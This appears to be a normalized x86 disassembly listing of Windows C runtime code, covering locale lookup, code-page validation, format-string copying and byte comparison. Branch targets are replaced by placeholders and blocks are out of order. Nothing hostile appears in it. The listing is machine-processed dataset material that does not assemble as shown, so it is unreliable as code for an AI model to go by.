call sub_200b53e
leave
retn
push [ ebp + 0x8 ]
push ecx
call sub_2014595
pop ecx
pop ecx
test eax eax
je r-xdata
mov al 0x4d
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x8 ] 0x1
dec eax
je r-xdata
mov eax [ ebp + 0x10 ]
cmp [ eax + 0x8 ] 0xb
mov eax [ ebp + 0x1c ]
jg r-xdata
sub eax 0x5
jne r-xdata
mov al 0x61
jmp r-xdata
dec eax
jne r-xdata
cmp [ ebx ] 0x0
je r-xdata
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
push r--data
push edi
call sub_2009a86
pop ecx
pop ecx
test eax eax
jne r-xdata
add edi 0x5
jmp r-xdata
mov eax edx
dec eax
je r-xdata
cmp ecx 0x4d
je r-xdata
cmp [ esi ] 0x0
jbe r-xdata
mov cl [ edi ]
mov eax [ esi ]
mov [ eax ] cl
inc [ esi ]
inc edi
dec [ ebx ]
cmp [ ebx ] 0x1
jbe r-xdata
mov al 0x53
jmp r-xdata
jmp r-xdata
mov edi [ eax + 0x9c ]
mov edi [ eax + 0x98 ]
jmp r-xdata
mov eax edx
dec eax
dec eax
je r-xdata
mov al 0x41
jmp r-xdata
cmp al 0x27
je r-xdata
mov al 0x70
jmp r-xdata
add edi 0x3
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x1
dec eax
je r-xdata
mov eax edx
dec eax
je r-xdata
cmp ecx 0x61
je r-xdata
lea eax [ edi + 0x1 ]
cmp [ eax ] 0x0
je r-xdata
mov al [ edi ]
test al al
jne r-xdata
cmp [ ebx ] 0x0
jbe r-xdata
cmp edx 0x1
jne r-xdata
mov al 0x79
jmp r-xdata
dec eax
dec eax
jne r-xdata
inc edi
jmp r-xdata
push [ ebp + 0x8 ]
movsx eax al
push eax
call sub_2014595
pop ecx
pop ecx
test eax eax
je r-xdata
mov al 0x48
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x8 ] 0x1
dec eax
je r-xdata
mov dl [ edi ]
mov ecx [ esi ]
mov [ ecx ] dl
inc [ esi ]
dec [ ebx ]
mov edi eax
cmp [ ebx ] 0x0
jbe r-xdata
jmp r-xdata
movsx eax [ edi ]
push [ ebp + 0x8 ]
push eax
call sub_2014595
pop ecx
pop ecx
test eax eax
je r-xdata
mov al 0x59
jmp r-xdata
mov eax [ esi ]
mov cl [ edi ]
mov [ eax ] cl
inc [ esi ]
inc edi
dec [ ebx ]
mov al [ edi ]
test al al
jne r-xdata
cmp [ ebx ] 0x1
jbe r-xdata
mov al 0x6d
jmp r-xdata
dec eax
je r-xdata
push [ ebp + 0x8 ]
movsx eax al
push eax
call sub_2014595
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ esi ]
mov cl [ edi ]
mov [ eax ] cl
inc [ esi ]
dec [ ebx ]
jmp r-xdata
cmp [ ebx ] 0x1
jbe r-xdata
jmp r-xdata
lea eax [ edi + 0x1 ]
cmp [ eax ] 0x0
je r-xdata
mov al 0x62
jmp r-xdata
dec eax
jne r-xdata
mov cl [ edi ]
mov eax [ esi ]
mov [ eax ] cl
inc [ esi ]
inc edi
dec [ ebx ]
cmp [ ebx ] 0x1
jbe r-xdata
lea eax [ edi + 0x1 ]
cmp [ eax ] 0x0
je r-xdata
mov dl [ edi ]
mov ecx [ esi ]
mov [ ecx ] dl
inc [ esi ]
dec [ ebx ]
mov edi eax
mov al 0x42
jmp r-xdata
lea eax [ edi + 0x1 ]
cmp [ eax ] 0x0
je r-xdata
mov dl [ edi ]
mov ecx [ esi ]
mov [ ecx ] dl
inc [ esi ]
dec [ ebx ]
mov edi eax
mov dl [ edi ]
mov ecx [ esi ]
mov [ ecx ] dl
inc [ esi ]
dec [ ebx ]
mov edi eax
sub_201cb9e
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push ebx
push [ ebp + 0x1c ]
xor ebx ebx
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x10 ] eax
call sub_20099ee
mov eax [ ebp + 0x8 ]
cmp eax ebx
jne r-xdata
push edi
mov edi [ ebp + 0xc ]
cmp edi ebx
jne r-xdata
call sub_200fb13
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
cmp [ ebp - 0x14 ] bl
je r-xdata
push esi
mov esi [ ebp + 0x10 ]
mov [ eax ] bl
cmp esi ebx
je r-xdata
call sub_200fb13
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
cmp [ ebp - 0x14 ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x18 ]
and [ eax + 0x70 ] 0xfffffffd
call sub_200fb13
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
mov eax [ ebp + 0x18 ]
cmp eax ebx
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x18 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
xor eax eax
mov eax [ ebp - 0x18 ]
and [ eax + 0x70 ] 0xfffffffd
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] edi
cmp edi ebx
jbe r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0xd4 ]
pop edi
mov eax [ ebp - 0x10 ]
mov [ eax ] bl
cmp [ ebp - 0x8 ] ebx
jne r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
cmp [ ebp - 0x4 ] ebx
ja r-xdata
cmp [ ebp - 0x4 ] ebx
jbe r-xdata
cmp al 0x25
je r-xdata
call sub_200fb13
mov [ eax ] 0x22
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] bl
sub edi [ ebp - 0x4 ]
mov eax edi
cmp [ ebp - 0x14 ] bl
je r-xdata
mov edx [ ebp + 0x14 ]
cmp edx ebx
je r-xdata
lea ecx [ ebp - 0x20 ]
movsx eax al
push ecx
push eax
call sub_2014595
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x14 ] bl
je r-xdata
pop esi
mov ecx [ ebp - 0x18 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
inc esi
xor eax eax
cmp [ esi ] 0x23
jne r-xdata
mov al [ esi ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] al
inc [ ebp + 0x8 ]
inc esi
dec [ ebp - 0x4 ]
jmp r-xdata
xor ecx ecx
inc ecx
cmp [ ebp - 0x4 ] ecx
jbe r-xdata
push eax
push [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov al [ esi ]
lea ecx [ ebp + 0x8 ]
call sub_201c355
add esp 0x10
test eax eax
je r-xdata
inc eax
inc esi
cmp [ ebp - 0x4 ] ebx
ja r-xdata
lea eax [ esi + 0x1 ]
cmp [ eax ] bl
je r-xdata
cmp [ ebp - 0x4 ] ebx
jbe r-xdata
inc esi
mov [ ebp - 0x8 ] ecx
mov cl [ esi ]
mov edx [ ebp + 0x8 ]
mov [ edx ] cl
inc [ ebp + 0x8 ]
dec [ ebp - 0x4 ]
mov esi eax
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
sub_201cd42
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x18 ]
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_201cb9e
add esp 0x18
pop ebp
retn
sub_201cd62
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_201cb9e
add esp 0x18
pop ebp
retn
sub_201cd81
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_201cb9e
add esp 0x18
pop ebp
retn
sub_201cdd0
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
lea ecx [ ecx ]
add edx 0x1
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
add ecx 0x1
mov al [ esi ]
or al al
je r-xdata
sub_201ce16
mov edi edi
push ebp
mov ebp esp
xor eax eax
push ebx
xor ebx ebx
inc eax
cmp [ ebp + 0xc ] ebx
jl r-xdata
xor ecx ecx
test eax eax
sete cl
pop ebx
mov eax ecx
pop ebp
retn
push esi
push edi
pop edi
pop esi
mov eax [ ebp + 0xc ]
add eax ebx
cdq
sub eax edx
mov esi eax
mov eax [ ebp + 0x8 ]
sar esi 0x1
lea edi [ eax + esi * 8 ]
push [ edi ]
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_2009b94
pop ecx
pop ecx
test eax eax
jne r-xdata
jge r-xdata
mov ecx [ ebp + 0x10 ]
add edi 0x4
mov [ ecx ] edi
jmp r-xdata
lea ebx [ esi + 0x1 ]
dec esi
mov [ ebp + 0xc ] esi
jmp r-xdata
cmp ebx [ ebp + 0xc ]
jle r-xdata
test eax eax
je r-xdata
sub_201ce8c
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi ecx
test esi esi
je r-xdata
push 0x8
lea eax [ ebp - 0xc ]
push eax
push 0x1004
push [ edi + 0x1c ]
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
push r--data
push eax
call sub_201a3a0
pop ecx
pop ecx
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
push r--data
push esi
call sub_201a3a0
pop ecx
pop ecx
test eax eax
je r-xdata
lea esi [ ebp - 0xc ]
call [ GetACP@IAT ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_200b53e
leave
retn
push r--data
push esi
call sub_201a3a0
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
call sub_200a046
pop ecx
push 0x8
lea eax [ ebp - 0xc ]
push eax
push 0xb
push [ edi + 0x1c ]
call [ GetLocaleInfoA@IAT ]
test eax eax
je r-xdata
sub_201cf30
mov edi edi
push ebp
mov ebp esp
xor eax eax
xor eax eax
pop ebp
retn
inc eax
inc eax
cmp eax 0x14
jb r-xdata
mov cx [ ebp + 0x8 ]
cmp cx [ eax + r--data ]
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_201cf54
mov edi edi
push esi
xor esi esi
jmp r-xdata
mov cl [ edx ]
test cl cl
jne r-xdata
mov al cl
sub al 0x61
inc edx
cmp al 0x5
ja r-xdata
mov eax esi
pop esi
retn
mov al cl
sub al 0x41
cmp al 0x5
ja r-xdata
add cl 0xd9
jmp r-xdata
movsx eax cl
shl esi 0x4
lea esi [ esi + eax - 0x30 ]
add cl 0xf9
sub_201cf88
xor eax eax
sub cl 0x61
cmp cl 0x19
ja r-xdata
cmp cl 0x5a
jle r-xdata
retn
inc eax
jmp r-xdata
mov cl [ edx ]
inc edx
cmp cl 0x41
jl r-xdata
sub_201cfa3
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_200d753
mov esi eax
mov edx edi
add esi 0x9c
call sub_201cf54
mov edi eax
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x14 ]
neg eax
sbb eax eax
and eax 0xfffff005
add eax 0x1002
push eax
push edi
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi + 0x4 ]
call sub_2009b94
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0x8 ] eax
inc eax
jmp r-xdata
mov eax [ esi + 0x8 ]
shr eax 0x2
not eax
and eax 0x1
push edi
call sub_201cf30
pop ecx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_200b53e
leave
retn 0x4
or [ esi + 0x8 ] 0x4
mov [ esi + 0x1c ] edi
mov [ esi + 0x18 ] edi
sub_201d03b
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0x3ff
push 0x1
or eax 0x400
push eax
mov esi ecx
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea edx [ ebp - 0x7c ]
call sub_201cf54
cmp [ ebp + 0x8 ] eax
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_200b53e
leave
retn
mov esi [ esi ]
push edi
mov edx esi
call sub_201cf88
push esi
mov edi eax
call sub_2016140
pop ecx
cmp edi eax
pop edi
je r-xdata
sub_201d0af
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_200d753
mov esi eax
mov edx edi
add esi 0x9c
call sub_201cf54
mov ebx [ GetLocaleInfoA@IAT ]
mov edi eax
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x14 ]
neg eax
sbb eax eax
and eax 0xfffff005
add eax 0x1002
push eax
push edi
call ebx
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi + 0x4 ]
call sub_2009b94
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov eax 0x300
and ecx eax
cmp ecx eax
je r-xdata
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x10 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push edi
call ebx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_200b53e
leave
retn 0x4
mov eax [ esi + 0x8 ]
shr eax 0x2
not eax
and eax 0x1
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x10 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push edi
call ebx
test eax eax
je r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_2009b94
pop ecx
pop ecx
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_2009b94
pop ecx
xor ebx ebx
pop ecx
test eax eax
jne r-xdata
test [ esi + 0x8 ] 0x2
jne r-xdata
or [ esi + 0x8 ] 0x304
mov [ esi + 0x18 ] edi
jmp r-xdata
cmp [ esi + 0x10 ] ebx
jne r-xdata
or [ esi + 0x8 ] 0x200
mov eax [ esi + 0x8 ]
cmp [ esi + 0x10 ] ebx
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov [ esi + 0x1c ] edi
cmp [ esi + 0xc ] ebx
je r-xdata
cmp [ esi + 0xc ] ebx
je r-xdata
or eax 0x100
mov [ esi + 0x8 ] eax
jmp r-xdata
mov edx [ esi + 0x8 ]
test dl 0x1
jne r-xdata
push eax
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_200b28b
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_2009b94
pop ecx
pop ecx
test eax eax
jne r-xdata
or [ esi + 0x8 ] 0x100
push [ esi ]
call sub_2016140
pop ecx
cmp eax [ esi + 0xc ]
jne r-xdata
cmp [ esi + 0x18 ] ebx
jne r-xdata
push edi
call sub_201cf30
pop ecx
test eax eax
je r-xdata
push [ esi ]
or [ esi + 0x8 ] 0x2
mov [ esi + 0x1c ] edi
call sub_2016140
pop ecx
cmp eax [ esi + 0xc ]
jne r-xdata
push ebx
mov [ esi + 0x18 ] edi
push 0x1
jmp r-xdata
or edx 0x1
mov [ esi + 0x8 ] edx
mov [ esi + 0x18 ] edi
jmp r-xdata
push edi
mov ecx esi
call sub_201d03b
pop ecx
pop ecx
test eax eax
je r-xdata
sub_201d281
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_200d753
mov esi eax
mov edx edi
add esi 0x9c
call sub_201cf54
mov edi eax
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x10 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push edi
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_2009b94
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0x8 ] eax
inc eax
jmp r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
cmp [ esi + 0x10 ] eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_200b53e
leave
retn 0x4
mov eax [ esi + 0x8 ]
shr eax 0x2
not eax
and eax 0x1
cmp [ esi + 0xc ] 0x0
je r-xdata
or [ esi + 0x8 ] 0x4
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
push 0x1
jmp r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_2009b94
pop ecx
pop ecx
test eax eax
jne r-xdata
push edi
mov ecx esi
call sub_201d03b
pop ecx
pop ecx
test eax eax
je r-xdata
push eax
sub_201d342
push [ esi + 0x4 ]
call sub_2016140
sub eax 0x3
neg eax
pop ecx
sbb eax eax
push 0x1
inc eax
push sub_201cfa3
mov [ esi + 0x14 ] eax
call [ EnumSystemLocalesA@IAT ]
test [ esi + 0x8 ] 0x4
jne r-xdata
retn
and [ esi + 0x8 ] 0x0
sub_201d36e
push [ esi ]
call sub_2016140
push [ esi + 0x4 ]
sub eax 0x3
neg eax
sbb eax eax
inc eax
mov [ esi + 0x10 ] eax
call sub_2016140
sub eax 0x3
neg eax
sbb eax eax
and [ esi + 0x18 ] 0x0
inc eax
cmp [ esi + 0x10 ] 0x0
pop ecx
pop ecx
mov [ esi + 0x14 ] eax
je r-xdata
mov edx [ esi ]
call sub_201cf88
push 0x2
pop eax
jmp r-xdata
and [ esi + 0x8 ] 0x0
test eax 0x200
je r-xdata
push 0x1
push sub_201d0af
mov [ esi + 0xc ] eax
call [ EnumSystemLocalesA@IAT ]
mov eax [ esi + 0x8 ]
test eax 0x100
je r-xdata
test al 0x7
jne r-xdata
retn
sub_201d3d5
push [ esi ]
call sub_2016140
sub eax 0x3
neg eax
sbb eax eax
inc eax
pop ecx
mov [ esi + 0x10 ] eax
je r-xdata
mov edx [ esi ]
call sub_201cf88
push 0x2
pop eax
jmp r-xdata
retn
and [ esi + 0x8 ] 0x0
push 0x1
push sub_201d281
mov [ esi + 0xc ] eax
call [ EnumSystemLocalesA@IAT ]
test [ esi + 0x8 ] 0x4
jne r-xdata
sub_201d411
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_200d753
mov ebx [ ebp + 0x8 ]
mov esi eax
add esi 0x9c
test ebx ebx
jne r-xdata
lea eax [ ebx + 0x40 ]
lea edi [ esi + 0x4 ]
mov [ esi ] ebx
mov [ edi ] eax
test eax eax
je r-xdata
or [ esi + 0x8 ] 0x104
jmp r-xdata
mov eax [ esi ]
and [ esi + 0x8 ] 0x0
test eax eax
je r-xdata
cmp [ eax ] 0x0
je r-xdata
call [ GetUserDefaultLCID@IAT ]
mov [ esi + 0x18 ] eax
mov [ esi + 0x1c ] eax
mov edi [ edi ]
test edi edi
je r-xdata
cmp [ eax ] 0x0
je r-xdata
push edi
push 0x16
push r--data
call sub_201ce16
add esp 0xc
xor eax eax
mov ecx ebx
sub ebx 0xffffff80
neg ecx
sbb ecx ecx
and ecx ebx
mov edi esi
call sub_201ce8c
mov edi eax
mov [ ebp + 0x8 ] edi
test edi edi
je r-xdata
mov [ esi + 0x8 ] 0x104
cmp [ edi ] 0x0
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
cmp edi 0xfde8
je r-xdata
push edi
call sub_2016140
sub eax 0x3
neg eax
pop ecx
sbb eax eax
push 0x1
inc eax
push sub_201cfa3
mov [ esi + 0x14 ] eax
call [ EnumSystemLocalesA@IAT ]
test [ esi + 0x8 ] 0x4
jne r-xdata
call sub_201d3d5
cmp [ eax ] 0x0
je r-xdata
cmp edi 0xfde9
je r-xdata
cmp [ esi + 0x8 ] 0x0
je r-xdata
and [ esi + 0x8 ] 0x0
jmp r-xdata
push esi
push 0x40
push r--data
call sub_201ce16
add esp 0xc
test eax eax
je r-xdata
call sub_201d36e
jmp r-xdata
movzx eax di
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
mov edi [ edi ]
test edi edi
je r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
push 0x1
push [ esi + 0x18 ]
call [ IsValidLocale@IAT ]
test eax eax
je r-xdata
call sub_201d3d5
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
call sub_201d36e
jmp r-xdata
mov ebx [ ebp + 0x10 ]
test ebx ebx
je r-xdata
mov cx [ esi + 0x18 ]
mov [ eax ] cx
mov cx [ esi + 0x1c ]
mov [ eax + 0x2 ] cx
mov [ eax + 0x4 ] di
xor eax eax
inc eax
jmp r-xdata
mov edi [ GetLocaleInfoA@IAT ]
mov ecx 0x814
cmp [ eax ] cx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push 0x40
push ebx
push 0x1001
push [ esi + 0x18 ]
call edi
test eax eax
je r-xdata
push r--data
push 0x40
push ebx
call sub_200a6e1
add esp 0xc
test eax eax
je r-xdata
push 0x40
lea eax [ ebx + 0x40 ]
push eax
push 0x1002
push [ esi + 0x1c ]
call edi
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_200f929
add esp 0x14
jmp r-xdata
push 0xa
push 0x10
sub ebx 0xffffff80
push ebx
push [ ebp + 0x8 ]
call sub_2024519
add esp 0x10
sub_201d62c
mov ax [ esi ]
cmp ax [ ecx ]
je r-xdata
xor eax eax
movzx edx [ ecx ]
movzx eax al
sub eax edx
je r-xdata
movzx eax [ esi + 0x1 ]
movzx ecx [ ecx + 0x1 ]
sub eax ecx
je r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
retn
xor ecx ecx
test eax eax
setg cl
lea ecx [ ecx + ecx - 0x1 ]
mov eax ecx
retn
sub_201d66c
mov eax [ esi ]
cmp eax [ ecx ]
je r-xdata
xor eax eax
movzx edx [ ecx ]
movzx eax al
sub eax edx
je r-xdata
movzx eax [ esi + 0x1 ]
movzx edx [ ecx + 0x1 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
movzx eax [ esi + 0x2 ]
movzx edx [ ecx + 0x2 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
retn
movzx eax [ esi + 0x3 ]
movzx ecx [ ecx + 0x3 ]
sub eax ecx
je r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
xor ecx ecx
test eax eax
setg cl
lea ecx [ ecx + ecx - 0x1 ]
mov eax ecx
retn
sub_201d6e4
mov edi edi
push esi
push edi
mov edi eax
jmp r-xdata
cmp edi 0x20
jae r-xdata
mov eax [ ecx ]
cmp eax [ edx ]
je r-xdata
add ecx edi
add edx edi
cmp edi 0x1f
ja r-xdata
xor eax eax
movzx esi al
movzx eax [ edx ]
sub esi eax
je r-xdata
xor eax eax
jmp [ edi * 4 + jump_table_201eaf8 ]
pop edi
pop esi
retn
mov eax [ ecx + 0x4 ]
cmp eax [ edx + 0x4 ]
je r-xdata
movzx esi [ ecx + 0x1 ]
movzx eax [ edx + 0x1 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
mov eax [ ecx - 0x1c ]
cmp eax [ edx - 0x1c ]
je r-xdata
mov eax [ ecx - 0x18 ]
cmp eax [ edx - 0x18 ]
je r-xdata
mov eax [ ecx - 0x14 ]
cmp eax [ edx - 0x14 ]
je r-xdata
mov eax [ ecx - 0x10 ]
cmp eax [ edx - 0x10 ]
je r-xdata
mov eax [ ecx - 0xc ]
cmp eax [ edx - 0xc ]
je r-xdata
mov eax [ ecx - 0x8 ]
cmp eax [ edx - 0x8 ]
je r-xdata
mov eax [ ecx - 0x4 ]
cmp eax [ edx - 0x4 ]
je r-xdata
mov eax [ ecx - 0x1d ]
cmp eax [ edx - 0x1d ]
je r-xdata
mov eax [ ecx - 0x19 ]
cmp eax [ edx - 0x19 ]
je r-xdata
mov eax [ ecx - 0x15 ]
cmp eax [ edx - 0x15 ]
je r-xdata
mov eax [ ecx - 0x11 ]
cmp eax [ edx - 0x11 ]
je r-xdata
mov eax [ ecx - 0xd ]
cmp eax [ edx - 0xd ]
je r-xdata
mov eax [ ecx - 0x9 ]
cmp eax [ edx - 0x9 ]
je r-xdata
mov eax [ ecx - 0x5 ]
cmp eax [ edx - 0x5 ]
je r-xdata
movzx eax [ ecx - 0x1 ]
movzx ecx [ edx - 0x1 ]
sub eax ecx
je r-xdata
mov eax [ ecx - 0x1e ]
cmp eax [ edx - 0x1e ]
je r-xdata
mov eax [ ecx - 0x1a ]
cmp eax [ edx - 0x1a ]
je r-xdata
mov eax [ ecx - 0x16 ]
cmp eax [ edx - 0x16 ]
je r-xdata
mov eax [ ecx - 0x12 ]
cmp eax [ edx - 0x12 ]
je r-xdata
mov eax [ ecx - 0xe ]
cmp eax [ edx - 0xe ]
je r-xdata
mov eax [ ecx - 0xa ]
cmp eax [ edx - 0xa ]
je r-xdata
mov eax [ ecx - 0x6 ]
cmp eax [ edx - 0x6 ]
je r-xdata
mov ax [ ecx - 0x2 ]
cmp ax [ edx - 0x2 ]
je r-xdata
mov eax [ ecx - 0x1f ]
cmp eax [ edx - 0x1f ]
je r-xdata
mov eax [ ecx - 0x1b ]
cmp eax [ edx - 0x1b ]
je r-xdata
mov eax [ ecx - 0x17 ]
cmp eax [ edx - 0x17 ]
je r-xdata
mov eax [ ecx - 0x13 ]
cmp eax [ edx - 0x13 ]
je r-xdata
mov eax [ ecx - 0xf ]
cmp eax [ edx - 0xf ]
je r-xdata
mov eax [ ecx - 0xb ]
cmp eax [ edx - 0xb ]
je r-xdata
mov eax [ ecx - 0x7 ]
cmp eax [ edx - 0x7 ]
je r-xdata
movzx esi [ ecx - 0x3 ]
movzx eax [ edx - 0x3 ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx + 0x4 ]
sub esi eax
je r-xdata
movzx esi [ ecx + 0x2 ]
movzx eax [ edx + 0x2 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
xor eax eax
movzx eax [ edx - 0x1c ]
movzx esi [ ecx - 0x1c ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x18 ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x14 ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x10 ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0xc ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x8 ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x4 ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x1d ]
sub esi eax
je r-xdata
xor eax eax
movzx eax [ edx - 0x19 ]
movzx esi [ ecx - 0x19 ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x15 ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x11 ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0xd ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x9 ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x5 ]
sub esi eax
je r-xdata
xor ecx ecx
test eax eax
setg cl
lea ecx [ ecx + ecx - 0x1 ]
mov eax ecx
jmp r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x1e ]
sub esi eax
je r-xdata
xor eax eax
movzx eax [ edx - 0x1a ]
movzx esi [ ecx - 0x1a ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x16 ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x12 ]
sub esi eax
